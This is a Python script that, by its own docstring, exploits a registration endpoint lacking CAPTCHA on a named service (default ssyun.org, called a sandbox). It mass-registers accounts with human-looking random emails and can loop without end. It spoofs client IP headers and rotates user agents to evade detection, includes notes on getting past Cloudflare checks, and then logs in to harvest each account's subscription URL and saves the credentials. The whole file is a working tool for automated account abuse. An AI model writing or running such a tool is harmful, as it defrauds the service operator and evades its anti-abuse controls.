#!/usr/bin/env python3
"""Exploit the sandbox registration endpoint that does not enforce CAPTCHA."""

from __future__ import annotations

import argparse
import json
import secrets
import string
import sys
import time
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlsplit, urlunsplit

import requests


CONFIG_PATH = "/api/v1/guest/comm/config"
REGISTER_PATH = "/api/v1/passport/auth/register"
LOGIN_PATH = "/api/v1/passport/auth/login"
SUBSCRIBE_PATH = "/api/v1/user/getSubscribe"


def normalize_base_url(base_url: str) -> str:
    """Strip SPA hash routes/paths so only scheme://host[:port] remains."""
    parts = urlsplit(base_url if "//" in base_url else "https://" + base_url)
    return urlunsplit((parts.scheme or "https", parts.netloc, "", "", ""))

# Natural-looking local-part fragments for less homogeneous emails.
_FIRST_NAMES = (
    "alex", "amy", "andy", "anna", "ben", "bob", "carl", "chen", "chris", "daisy",
    "david", "ella", "eric", "eva", "frank", "grace", "harry", "helen", "ivan",
    "jack", "james", "jane", "jason", "jenny", "jerry", "jim", "joe", "john",
    "kate", "kevin", "leo", "lily", "linda", "lisa", "lucy", "mark", "mary",
    "max", "mike", "nancy", "nick", "nina", "oliver", "paul", "peter", "ray",
    "rita", "ryan", "sam", "sara", "sean", "sophia", "steve", "susan", "tom",
    "tony", "victor", "wendy", "will", "yuan", "zhang", "zhao", "zhou", "lin",
    "wang", "li", "huang", "wu", "xu", "sun", "ma", "zhu", "hu", "guo", "he",
)
_LAST_NAMES = (
    "smith", "jones", "brown", "wilson", "taylor", "clark", "lee", "walker",
    "hall", "allen", "young", "king", "wright", "scott", "green", "baker",
    "adams", "nelson", "hill", "campbell", "mitchell", "roberts", "carter",
    "phillips", "evans", "turner", "parker", "collins", "edward", "stewart",
    "chen", "wang", "li", "zhang", "liu", "yang", "huang", "zhao", "wu",
    "zhou", "xu", "sun", "ma", "zhu", "hu", "guo", "he", "gao", "lin", "luo",
)
_WORD_POOL = (
    "cloud", "nova", "pixel", "orbit", "wave", "spark", "bloom", "coral",
    "delta", "echo", "frost", "glint", "haze", "iris", "jade", "kite",
    "lotus", "mint", "neon", "olive", "pearl", "quartz", "ridge", "sage",
    "tide", "ultra", "vista", "willow", "xenon", "amber", "breeze", "canyon",
)
_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
)


def _digits(n: int) -> str:
    return "".join(secrets.choice(string.digits) for _ in range(n))


def _rand_int(low: int, high: int) -> int:
    return low + secrets.randbelow(high - low + 1)


def random_local_part() -> str:
    """Generate a varied, human-looking email local part."""
    first = secrets.choice(_FIRST_NAMES)
    last = secrets.choice(_LAST_NAMES)
    word = secrets.choice(_WORD_POOL)
    year = str(_rand_int(1988, 2006))
    styles = (
        lambda: f"{first}.{last}{_digits(_rand_int(0, 3))}",
        lambda: f"{first}{last}{_digits(_rand_int(1, 4))}",
        lambda: f"{first}_{last}{_digits(_rand_int(0, 3))}",
        lambda: f"{first}{_digits(_rand_int(2, 4))}",
        lambda: f"{last}{first}{_digits(_rand_int(1, 3))}",
        lambda: f"{word}{first}{_digits(_rand_int(1, 3))}",
        lambda: f"{first}.{word}{_digits(_rand_int(0, 3))}",
        lambda: f"{word}_{_digits(_rand_int(2, 4))}",
        lambda: f"{first}{year}",
        lambda: f"{first[0]}{last}{_digits(_rand_int(2, 4))}",
        lambda: f"{word}{_digits(_rand_int(3, 5))}",
        lambda: f"{first}{_digits(2)}{last[:3]}",
        lambda: secrets.token_hex(_rand_int(4, 7)),
        lambda: f"{first}{secrets.token_hex(2)}",
        lambda: f"{word}.{last}{_digits(_rand_int(0, 2))}",
    )
    local = secrets.choice(styles)()
    # Email local parts are case-insensitive; keep lowercase for consistency.
    return local.lower().strip(".")


def random_password(length: int = 18) -> str:
    """Generate a varied password (not a fixed prefix)."""
    length = max(12, length)
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    digits = string.digits
    special = "!@#$%^&*-_"
    # Guarantee character classes then fill randomly.
    chars = [
        secrets.choice(lower),
        secrets.choice(upper),
        secrets.choice(digits),
        secrets.choice(special),
    ]
    alphabet = lower + upper + digits + special
    chars.extend(secrets.choice(alphabet) for _ in range(length - len(chars)))
    # Fisher–Yates shuffle with secrets.
    for i in range(len(chars) - 1, 0, -1):
        j = secrets.randbelow(i + 1)
        chars[i], chars[j] = chars[j], chars[i]
    return "".join(chars)


def pick_email_domain(domains: list[str], preferred: str | None = None) -> str:
    """Pick a whitelist domain; preferred if valid, otherwise random."""
    cleaned = [d.strip().lstrip("@") for d in domains if isinstance(d, str) and d.strip()]
    # Deduplicate while preserving order.
    seen: set[str] = set()
    unique: list[str] = []
    for domain in cleaned:
        key = domain.lower()
        if key not in seen:
            seen.add(key)
            unique.append(domain)
    if not unique:
        raise RuntimeError("no usable email domains")
    if preferred:
        preferred = preferred.strip().lstrip("@")
        if preferred not in unique and preferred.lower() not in seen:
            raise RuntimeError(f"email domain not in whitelist: {preferred}")
        # Prefer exact match, else case-insensitive.
        for domain in unique:
            if domain == preferred or domain.lower() == preferred.lower():
                return domain
    return secrets.choice(unique)


def build_credentials(domain: str) -> tuple[str, str]:
    """Build a random email@domain and password."""
    local_part = random_local_part()
    password = random_password()
    return f"{local_part}@{domain}", password


def random_public_ipv4() -> str:
    """Return a random public-looking IPv4 (avoid private/reserved ranges)."""
    while True:
        a = secrets.choice((1, 2, 3, 5, 8, 13, 23, 27, 31, 36, 39, 42, 45, 49,
                            50, 54, 58, 59, 60, 61, 62, 63, 64, 66, 67, 68, 69,
                            70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82,
                            83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95,
                            96, 97, 98, 99, 101, 103, 104, 106, 110, 111, 112,
                            113, 114, 115, 116, 117, 118, 119, 120, 121, 122,
                            123, 124, 125, 128, 129, 130, 131, 132, 133, 134,
                            135, 136, 137, 138, 139, 140, 141, 142, 143, 144,
                            145, 146, 147, 148, 149, 150, 151, 152, 153, 154,
                            155, 156, 157, 158, 159, 160, 161, 162, 163, 164,
                            165, 166, 167, 168, 169, 170, 171, 172, 173, 174,
                            175, 176, 177, 178, 179, 180, 181, 182, 183, 184,
                            185, 186, 187, 188, 189, 190, 191, 193, 194, 195,
                            196, 197, 198, 199, 200, 201, 202, 203, 204, 205,
                            206, 207, 208, 209, 210, 211, 212, 213, 214, 215,
                            216, 217, 218, 219, 220, 221, 222, 223))
        b = secrets.randbelow(256)
        c = secrets.randbelow(256)
        d = _rand_int(1, 254)
        # Skip well-known private/special pockets that may still slip through.
        if a == 10:
            continue
        if a == 172 and 16 <= b <= 31:
            continue
        if a == 192 and b == 168:
            continue
        if a == 100 and 64 <= b <= 127:  # CGNAT
            continue
        if a == 169 and b == 254:  # link-local
            continue
        return f"{a}.{b}.{c}.{d}"


def random_client_headers() -> dict[str, str]:
    """Headers that diversify apparent client IP / browser fingerprint.

    Note: do NOT set CF-Connecting-IP — Cloudflare rejects spoofed values with Error 1000.
    X-Forwarded-For / X-Real-IP / True-Client-IP are kept for origin-side logging only.
    """
    ip = random_public_ipv4()
    # Occasionally chain a second hop in X-Forwarded-For.
    if secrets.randbelow(3) == 0:
        xff = f"{ip}, {random_public_ipv4()}"
    else:
        xff = ip
    headers = {
        "User-Agent": secrets.choice(_USER_AGENTS),
        "X-Forwarded-For": xff,
        "X-Real-IP": ip,
        "X-Client-IP": ip,
        "True-Client-IP": ip,
        "Accept-Language": secrets.choice(
            (
                "zh-CN,zh;q=0.9,en;q=0.8",
                "zh-CN,zh;q=0.9",
                "en-US,en;q=0.9",
                "en-US,en;q=0.8,zh-CN;q=0.6",
                "zh-TW,zh;q=0.9,en;q=0.7",
            )
        ),
    }
    return headers


def apply_random_client(session: requests.Session) -> dict[str, str]:
    """Apply a fresh random client fingerprint to the session; return headers used."""
    # Drop any previously spoofed CF header so a retry cannot keep a bad value.
    session.headers.pop("CF-Connecting-IP", None)
    headers = random_client_headers()
    session.headers.update(headers)
    return headers


def summarize_failure(result: dict[str, Any]) -> str | None:
    """Human-readable reason when registration/subscribe fails."""
    if result.get("error"):
        return str(result["error"])
    if result.get("subscribe_error"):
        return f"订阅提取失败: {result['subscribe_error']}"
    payload = result.get("response")
    if isinstance(payload, dict):
        for key in ("title", "message", "detail", "error"):
            value = payload.get(key)
            if isinstance(value, str) and value.strip():
                status = result.get("http_status")
                prefix = f"HTTP {status}: " if status else ""
                return f"{prefix}{value.strip()}"
    status = result.get("http_status")
    if status and not (200 <= int(status) < 300):
        return f"HTTP {status}"
    return None


def api_url(base_url: str, path: str) -> str:
    return urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))


def response_payload(response: requests.Response) -> Any:
    try:
        return response.json()
    except requests.JSONDecodeError:
        return response.text[:1000]


def get_email_domains(session: requests.Session, base_url: str, timeout: float) -> list[str]:
    response = session.get(api_url(base_url, CONFIG_PATH), timeout=timeout)
    response.raise_for_status()
    payload = response.json()
    data = payload.get("data", payload) if isinstance(payload, dict) else {}

    for key in ("email_whitelist_suffix_ssyun", "email_whitelist_suffix"):
        domains = data.get(key)
        if isinstance(domains, list) and all(isinstance(domain, str) for domain in domains):
            return domains
    raise RuntimeError("registration config did not expose an email whitelist")


def registration_succeeded(status: int, payload: Any) -> bool:
    if not 200 <= status < 300:
        return False
    if not isinstance(payload, dict):
        return True
    return payload.get("status") in (None, "success") and payload.get("code", 0) in (0, 200)


def extract_auth_data(payload: Any) -> str | None:
    if not isinstance(payload, dict):
        return None
    data = payload.get("data")
    if not isinstance(data, dict):
        return None
    auth_data = data.get("auth_data")
    return auth_data if isinstance(auth_data, str) and auth_data else None


def login_auth_data(
    session: requests.Session, base_url: str, email: str, password: str, timeout: float
) -> str:
    response = session.post(
        api_url(base_url, LOGIN_PATH),
        json={"email": email, "password": password},
        timeout=timeout,
    )
    response.raise_for_status()
    auth_data = extract_auth_data(response_payload(response))
    if not auth_data:
        raise RuntimeError("login did not return authorization data")
    return auth_data


def fetch_subscribe_url(
    session: requests.Session,
    base_url: str,
    timeout: float,
    *,
    auth_data: str | None = None,
    email: str | None = None,
    password: str | None = None,
) -> str:
    token = auth_data
    if not token:
        if not email or not password:
            raise RuntimeError("no auth data or credentials available to fetch subscription")
        token = login_auth_data(session, base_url, email, password, timeout)

    response = session.get(
        api_url(base_url, SUBSCRIBE_PATH),
        headers={"Authorization": token},
        timeout=timeout,
    )
    response.raise_for_status()
    payload = response_payload(response)
    if not isinstance(payload, dict) or payload.get("status") not in (None, "success"):
        message = payload.get("message") if isinstance(payload, dict) else None
        raise RuntimeError(message or "subscribe request failed")

    data = payload.get("data", payload)
    if not isinstance(data, dict):
        raise RuntimeError("subscribe response missing data")
    url = data.get("subscribe_url")
    if not isinstance(url, str) or not url:
        raise RuntimeError("account has no subscription URL")
    return url


def attach_subscribe_url(
    session: requests.Session,
    base_url: str,
    timeout: float,
    result: dict[str, Any],
    payload: Any,
    email: str,
    password: str,
) -> None:
    try:
        result["subscribe_url"] = fetch_subscribe_url(
            session,
            base_url,
            timeout,
            auth_data=extract_auth_data(payload),
            email=email,
            password=password,
        )
    except (requests.RequestException, RuntimeError, ValueError, TypeError) as error:
        result["subscribe_error"] = str(error)


def append_result(output: Path | None, result: dict[str, Any]) -> None:
    if output is None:
        return
    with output.open("a", encoding="utf-8") as stream:
        stream.write(json.dumps(result, ensure_ascii=False) + "\n")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="https://ssyun.org", help="Sandbox site origin")
    parser.add_argument("--count", type=int, default=1, help="Accounts to create; 0 loops forever")
    parser.add_argument("--delay", type=float, default=0.5, help="Seconds between registrations")
    parser.add_argument("--email-domain", help="Whitelist domain; defaults to one from live config")
    parser.add_argument("--timeout", type=float, default=15, help="HTTP timeout in seconds")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification")
    parser.add_argument("--output", type=Path, help="Append successful credentials as JSONL")
    parser.add_argument(
        "--skip-subscribe",
        action="store_true",
        help="Do not fetch subscribe_url after a successful registration",
    )
    parser.add_argument("--continue-on-error", action="store_true", help="Keep looping after failed attempts")
    arguments = parser.parse_args()

    if arguments.count < 0 or arguments.delay < 0 or arguments.timeout <= 0:
        parser.error("--count and --delay must be non-negative; --timeout must be positive")

    base_url = normalize_base_url(arguments.base_url)

    session = requests.Session()
    session.trust_env = False  # ignore system Clash/HTTP proxy for control-plane calls
    session.headers.update({"Accept": "application/json", "Content-Type": "application/json"})
    session.verify = not arguments.insecure

    try:
        domains = get_email_domains(session, base_url, arguments.timeout)
    except requests.RequestException as error:
        print(f"config request failed: {error}", file=sys.stderr)
        return 2
    except (ValueError, RuntimeError) as error:
        print(f"invalid registration config: {error}", file=sys.stderr)
        return 2

    try:
        if arguments.email_domain:
            # Validate preferred domain once; still randomize local part each loop.
            pick_email_domain(domains, arguments.email_domain)
    except RuntimeError as error:
        print(f"{error}; whitelist: {', '.join(domains)}", file=sys.stderr)
        return 2

    register_url = api_url(base_url, REGISTER_PATH)
    index = 0
    while arguments.count == 0 or index < arguments.count:
        index += 1
        domain = pick_email_domain(domains, arguments.email_domain)
        email, password = build_credentials(domain)
        client_headers = apply_random_client(session)
        try:
            response = session.post(
                register_url,
                json={"email_ssyun": email, "password_ssyun": password, "invite_code": ""},
                timeout=arguments.timeout,
            )
            payload = response_payload(response)
            succeeded = registration_succeeded(response.status_code, payload)
            result = {
                "index": index,
                "email": email,
                "password": password,
                "client_ip": client_headers.get("X-Real-IP"),
                "user_agent": client_headers.get("User-Agent"),
                "http_status": response.status_code,
                "success": succeeded,
                "response": payload,
            }
            if succeeded and not arguments.skip_subscribe:
                attach_subscribe_url(
                    session,
                    base_url,
                    arguments.timeout,
                    result,
                    payload,
                    email,
                    password,
                )
        except requests.RequestException as error:
            succeeded = False
            result = {
                "index": index,
                "email": email,
                "password": password,
                "client_ip": client_headers.get("X-Real-IP"),
                "success": False,
                "error": str(error),
            }

        print(json.dumps(result, ensure_ascii=False), flush=True)
        if succeeded:
            append_result(arguments.output, result)
        elif not arguments.continue_on_error:
            return 1

        if (arguments.count == 0 or index < arguments.count) and arguments.delay:
            time.sleep(arguments.delay)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
